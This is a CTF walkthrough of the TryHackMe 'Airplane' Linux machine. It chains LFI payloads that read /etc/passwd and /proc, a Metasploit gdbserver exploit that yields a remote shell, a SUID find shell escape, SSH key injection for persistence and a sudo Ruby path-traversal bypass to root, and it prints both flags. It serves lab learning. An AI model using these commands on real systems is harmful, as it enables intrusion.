# Airplane - TryHackMe Writeup

## Overview

Today we have another **Medium** difficulty **TryHackMe** challenge which is a Linux-based machine named **Airplane**.

Our objective is to enumerate the target machine, identify vulnerabilities, gain an initial foothold, escalate our privileges, and finally obtain both the user and root flags.

---

# Target Information

**Machine IP**

```text
10.49.165.214
```

---

# Reconnaissance

As always, the first step is to perform a full TCP port scan to identify the exposed services running on the target.

```bash
nmap -p- 10.49.165.214
```

The scan reveals three open ports.

```text
PORT     STATE SERVICE
22/tcp   open  ssh
6048/tcp open  x11
8000/tcp open  http-alt
```

Only three services are exposed to us:

* SSH
* Port 6048
* HTTP service on port 8000

To gather additional information about these services, let's perform service version detection together with the default NSE scripts.

```bash
nmap -sC -sV 10.49.165.214
```

Output:

```text
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
6048/tcp open  x11?
8000/tcp open  http    Werkzeug httpd 3.0.2 (Python 3.8.10)
```

Some interesting information gathered from this scan:

* Port **22** is running **OpenSSH 8.2p1**.
* Port **8000** is running a **Werkzeug Python Web Server**.
* The website redirects users to:

```text
http://airplane.thm:8000
```

Since a hostname is required, we first update our hosts file.

```bash
echo "10.49.165.214 airplane.thm" | sudo tee -a /etc/hosts
```

Now we can browse the application normally.

---

# Web Enumeration

After opening the website, we are presented with an informational webpage related to airplanes.

The application itself appears fairly small.

Some initial checks performed:

* Source Code Inspection
* Browser Developer Tools
* Burp Suite Interception

Unfortunately, none of these immediately reveal anything interesting.

To better understand how the application works, every request is intercepted through **Burp Suite** while manually browsing the website.

At this stage there are no obvious credentials, hidden comments, or exposed JavaScript files that could lead to initial access.

Since manual browsing did not reveal much, the next logical step is content discovery.

---

# Directory Enumeration

We begin by fuzzing directories using Gobuster.

```bash
gobuster dir \
-u http://airplane.thm:8000/ \
-w /usr/share/wordlists/dirb/big.txt
```

After a few moments Gobuster discovers an interesting directory.

```text
/airplane
```

Browsing to this directory does not immediately provide anything useful.

We continue fuzzing additional files and directories but unfortunately nothing interesting is discovered.

At this point the application appears intentionally minimal.

---

# Looking for Parameters

While exploring the website more carefully, one parameter immediately stands out.

```text
?page=
```

Since the application dynamically loads pages using this parameter, it becomes a good candidate for **Local File Inclusion (LFI)** testing.

Instead of manually trying payloads one by one, we use **ffuf** together with a well-known LFI payload list.

```bash
ffuf \
-w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
-u "http://airplane.thm:8000/?page=FUZZ" \
-ac \
-mc 200 \
-s
```

Several payloads successfully return valid responses.

Some of the working payloads include:

```text
../../../../etc/passwd
../../../../../../../../../../etc/passwd
../../../../../../../../../../../../etc/passwd
/%2e%2e/%2e%2e/%2e%2e/etc/passwd
../../../../../../../../../../../../etc/hosts
```

This confirms that the application is vulnerable to **Local File Inclusion**.

---

# Reading /etc/passwd

One of the first files we attempt to read is:

```text
/etc/passwd
```

The request returns the contents successfully.

From the passwd file we identify several users.

One username immediately catches our attention.

```text
hudson
```

Since usernames often become useful later for SSH access or privilege escalation, we make a note of it.

Finding valid usernames is a common benefit of LFI vulnerabilities because many Linux systems expose local account information through the passwd file.

---

# Enumerating the Running Process

Reading system files through LFI is only the beginning.

The next step is understanding how the vulnerable application itself is running.

Using Burp Suite we request:

```http
GET /?page=../../../../proc/self/cmdline HTTP/1.1
Host: airplane.thm:8000
```

The response reveals the command used to start the web application.

```text
/usr/bin/python3 app.py
```

This tells us that the vulnerable service is running as a Python application.

The `/proc/self` directory represents information about the current running process, making it extremely valuable during Local File Inclusion attacks.

---

# Understanding /proc

The Linux `/proc` filesystem exposes runtime information about processes currently executing on the machine.

Some particularly useful files include:

| File                 | Purpose                           |
| -------------------- | --------------------------------- |
| `/proc/self/cmdline` | Shows how the process was started |
| `/proc/self/cwd`     | Current working directory         |
| `/proc/self/environ` | Environment variables             |
| `/proc/self/maps`    | Memory mappings                   |
| `/proc/net/tcp`      | Active TCP sockets                |

One useful observation is that `/proc/self/cwd` points to the application's current working directory, allowing us to understand where the web application is executing from.

---

# Enumerating Open Ports

While reading `/proc/net/tcp`, we notice another interesting detail.

Linux stores listening ports in hexadecimal format.

One of the entries corresponds to:

```text
0x17A0
```

Converting hexadecimal **17A0** into decimal gives:

```text
6048
```

This matches the unknown service we previously discovered during the Nmap scan.

Instead of treating port **6048** as a mystery service, we now know that it belongs to another locally running process.

This strongly suggests there may be another application listening internally that deserves further investigation.

---

# Enumerating Running Processes

At this stage we know:

* Port 6048 exists
* The application runs with Python
* LFI allows us to read arbitrary files

The next objective is identifying which process owns port **6048**.

Instead of guessing process IDs manually, we automate the search.

```bash
for i in {1..1000}; do
echo -n "\r$i"
out=$(curl -s \
"http://airplane.thm:8000/?page=../../../../../proc/$i/cmdline" \
| sed 's/\x00/ /g' \
| grep -v 'Page not found')

if [ -n "$out" ]; then
echo "\r$i : $out"
fi
done
```

This script loops through process IDs from **1 to 1000**, requesting each process's command line through the LFI vulnerability.

Whenever a valid process exists, the command line is displayed.

Eventually one process stands out.

It reveals that a **gdbserver** instance is running.

This is an extremely important discovery.

---

# Identifying the GDB Server

The presence of a running **gdbserver** immediately changes our attack path.

Normally, **gdbserver** is intended for developers to remotely debug applications.

However, if exposed without authentication, it can allow remote code execution.

Since Nmap already showed that port **6048** was accessible, the information obtained through `/proc` now explains exactly what that service is.

Instead of wasting time searching for custom exploits, we search Metasploit.

```bash
search gdb
```

Metasploit returns the following module.

```text
exploit/multi/gdb/gdb_server_exec
```

This module targets exposed GDB servers and allows command execution.

---

# Exploiting the GDB Server

Load the exploit.

```bash
use exploit/multi/gdb/gdb_server_exec
```

Configure the required options.

```text
RHOSTS = 10.49.165.214
RPORT  = 6048
LHOST  = <Your VPN IP>
```

Run the exploit.

```bash
exploit
```

The exploit successfully completes.

```text
Performing handshake with gdbserver...

Stepping program to find PC...

Writing payload...

Executing payload...

Command shell session opened
```

Checking our privileges confirms successful code execution.

```bash
id
```

Output:

```text
uid=1001(hudson)
gid=1001(hudson)
groups=1001(hudson)
```

Instead of gaining access as a low-privileged web user such as **www-data**, exploiting the exposed GDB server immediately provides a shell as the **hudson** user.

This gives us a much stronger foothold on the machine.

---

# Enumerating as Hudson

After obtaining the shell, we begin basic enumeration.

Listing the home directory shows the typical Linux user structure.

```bash
ls -lah
```

We observe standard directories along with one particularly interesting folder.

```text
app/
```

The application directory is writable by the **hudson** user.

While enumerating neighboring home directories, we also discover another local user.

```text
/home/carlos
```

Attempting to enter Carlos's home directory fails.

```bash
cd ../carlos
```

Output:

```text
Permission denied
```

This confirms that Carlos is another user on the system and will likely become our next privilege-escalation target.

At this stage we have:

* Initial foothold as **hudson**
* Identified another local user (**carlos**)
* Confirmed an exposed GDB server led to code execution
* Identified a writable application directory
* Begun local enumeration for privilege escalation

The next step is to enumerate SUID binaries and search for privilege escalation vectors.


# Privilege Escalation

After gaining access as the **hudson** user, the next objective is to enumerate the system for possible privilege escalation vectors.

One of the first checks performed on every Linux machine is searching for **SUID binaries**, as misconfigured SUID files often allow privilege escalation.

---

# Enumerating SUID Binaries

Run the following command:

```bash
find / -perm -4000 2>/dev/null
```

Among the normal SUID binaries, one entry immediately stands out.

```text
/usr/bin/find
```

Normally, the `find` binary is not dangerous. However, if it has the **SUID bit** set, it executes with the permissions of its owner instead of the current user.

This makes it an excellent privilege escalation candidate.

---

# Exploiting the SUID Find Binary

Searching GTFOBins for **find** reveals a privilege escalation technique using the `-exec` option.

Execute:

```bash
find . -exec /bin/sh -p \; -quit
```

Checking our privileges:

```bash
id
```

Output:

```text
uid=1001(hudson)
gid=1001(hudson)
euid=1000(carlos)
groups=1001(hudson)
```

Although our real user is still **hudson**, the effective UID has now become **carlos**.

This works because the SUID version of `find` executes `/bin/sh` while preserving the owner's privileges using the `-p` flag.

Instead of exploiting a software vulnerability, we are abusing an **insecure SUID configuration**.

---

# Accessing Carlos' Home Directory

Now that our effective user is Carlos, we can finally access his home directory.

Previously we received:

```text
Permission denied
```

After obtaining Carlos' effective privileges, the directory becomes accessible.

Instead of relying on this temporary shell, we decide to establish a permanent login by adding our own SSH public key.

---

# Generating an SSH Key

On the attacker machine, generate a key pair.

```bash
ssh-keygen -t rsa
```

This creates:

```text
id_rsa
id_rsa.pub
```

The public key will be copied into Carlos' `authorized_keys` file.

---

# Injecting Our Public Key

Append the generated public key to Carlos' SSH directory.

```bash
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCSLw6ln7Wlgx05LIFliaBpXKZB8ZF4oEbpFprGqnsk2IQ5pE1DOxLjxmhy5/fG7TbazrE6uju/6L5Tgg8PCqSomkhT/zenmhMfRziXadSZ0pdVdXNWgUj1EEHrkrixPuPQsf1bExlgKBJxka7WOJElZJ7r0BLuHAKog2cH0iQXkHHpaYb+za24tQyIinBXlrockb+hN30C/6tAWTeKV0oTeAVhI/a5WlSBT2xk8/OElfVMTe9cOhhjNVS0Dp6sp+4D3Df2QPOI7p4bxVqMGlRNjJFK0GISmUMq6RP1DKK7xFqY/gzpvjyvC2sr/yJo9aHRRNTYvbJX8oGPKrGRDJk/KVDRzWb7w41vdLhsLp1GnQYQs5ipKTLahKD5Xl8x1aU18teOEcLMRiPnSC7bNAOM9OMeufhO0oFVV/U7QJI3RVnkqeMk/IkNU3G51qghD+FHYZEFFkE3v39D42iwj4f0d6ouCwalXE4TWDbcZZGVNw5CY4WwUxoPa3+kEVE+3UE= root@kali' > /home/carlos/.ssh/authorized_keys
```

Now simply SSH into the machine as Carlos.

```bash
ssh carlos@airplane.thm
```

Login succeeds successfully.

---

# User Flag

Listing Carlos' home directory reveals the user flag.

```bash
ls
```

```text
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
user.txt
```

Reading the flag:

```bash
cat user.txt
```

```text
eebfca2ca5a2b8a56c46c781aeea7562
```

The first objective has now been completed.

---

# Privilege Escalation to Root

The next step is to determine whether Carlos has any sudo privileges.

Running:

```bash
sudo -l
```

returns:

```text
Matching Defaults entries for carlos on airplane:

env_reset,
mail_badpass,
secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User carlos may run the following commands:

(ALL) NOPASSWD:
/usr/bin/ruby /root/*.rb
```

This is an interesting sudo rule.

Carlos is allowed to execute:

```text
/usr/bin/ruby /root/*.rb
```

as **root** without providing a password.

At first glance this appears secure because only Ruby scripts inside `/root` should be executable.

However, Linux path traversal allows us to bypass this restriction.

---

# Understanding the Misconfiguration

The sudo policy checks that the supplied path matches:

```text
/root/*.rb
```

But Linux resolves path traversal sequences like:

```text
/root/../tmp/
```

before opening the file.

This means:

```text
/root/../tmp/shell.rb
```

ultimately becomes:

```text
/tmp/shell.rb
```

while still satisfying the sudo rule.

This results in arbitrary Ruby code being executed as root.

---

# Creating a Malicious Ruby Script

Create a Ruby script inside `/tmp`.

```bash
echo 'exec "/bin/sh"' > /tmp/shell.rb
```

The script simply executes a root shell.

---

# Exploiting the Sudo Rule

Instead of executing:

```text
/root/shell.rb
```

which we cannot create,

we abuse directory traversal.

```bash
sudo /usr/bin/ruby /root/../tmp/shell.rb
```

The command executes successfully.

Checking our privileges:

```bash
id
```

Output:

```text
uid=0(root)
gid=0(root)
groups=0(root)
```

We have successfully obtained a root shell.

---

# Root Flag

Reading the root flag:

```bash
cat /root/root.txt
```

```text
190dcbeb688ce5fe029f26a1e5fce002
```

Machine complete.

---

# Complete Attack Chain

```text
Nmap Scan
      │
      ▼
Werkzeug Web Application
      │
      ▼
Directory Enumeration
      │
      ▼
LFI Discovery (?page=)
      │
      ▼
Read /etc/passwd
      │
      ▼
Read /proc Files
      │
      ▼
Enumerate Running Processes
      │
      ▼
Discover Exposed GDB Server
      │
      ▼
Metasploit gdb_server_exec
      │
      ▼
Shell as Hudson
      │
      ▼
SUID Enumeration
      │
      ▼
SUID Find Binary
      │
      ▼
Shell with Carlos Effective UID
      │
      ▼
SSH Key Injection
      │
      ▼
SSH Login as Carlos
      │
      ▼
User Flag
      │
      ▼
sudo -l
      │
      ▼
Ruby Wildcard Misconfiguration
      │
      ▼
Path Traversal
      │
      ▼
Execute Arbitrary Ruby Script
      │
      ▼
Root Shell
      │
      ▼
Root Flag
```

---

# Vulnerabilities Identified

During this machine we successfully chained multiple vulnerabilities together to achieve full system compromise.

* Local File Inclusion (LFI)
* Information Disclosure through `/proc`
* Exposed GDB Server
* Remote Code Execution through GDB
* Insecure SUID `find` Binary
* SSH Authorized Key Injection
* Dangerous `sudo` Wildcard Configuration
* Path Traversal Bypass
* Arbitrary Ruby Code Execution as Root

---

# Tools Used

* Nmap
* Burp Suite
* Gobuster
* ffuf
* curl
* Metasploit Framework
* gdb_server_exec
* SSH
* GTFOBins
* find
* Ruby

---

# Lessons Learned

This machine demonstrates how seemingly unrelated weaknesses can be chained together into a complete compromise.

The attack began with a Local File Inclusion vulnerability, allowing access to sensitive files such as `/etc/passwd` and the `/proc` filesystem. By abusing `/proc`, it became possible to identify an exposed **GDB Server**, which ultimately led to remote code execution and an initial shell as the `hudson` user.

During local enumeration, a misconfigured **SUID `find` binary** provided an effective UID of another user (`carlos`). This access was made persistent by injecting an SSH public key into Carlos' `authorized_keys` file.

Finally, an insecure sudo rule allowing execution of **Ruby scripts** under `/root/*.rb` was bypassed using path traversal (`/root/../tmp/shell.rb`), resulting in arbitrary Ruby code execution as root and complete compromise of the system.

This challenge highlights the importance of secure service configuration, proper SUID permissions, protecting debugging services from public access, restricting SSH key modification, and writing precise sudo rules that cannot be bypassed using filesystem traversal techniques.

---

# Flags

## User Flag

```text
eebfca2ca5a2b8a56c46c781aeea7562
```

## Root Flag

```text
190dcbeb688ce5fe029f26a1e5fce002
```

---

**Machine Status:** Complete ✅
**Jai Shri Ram**
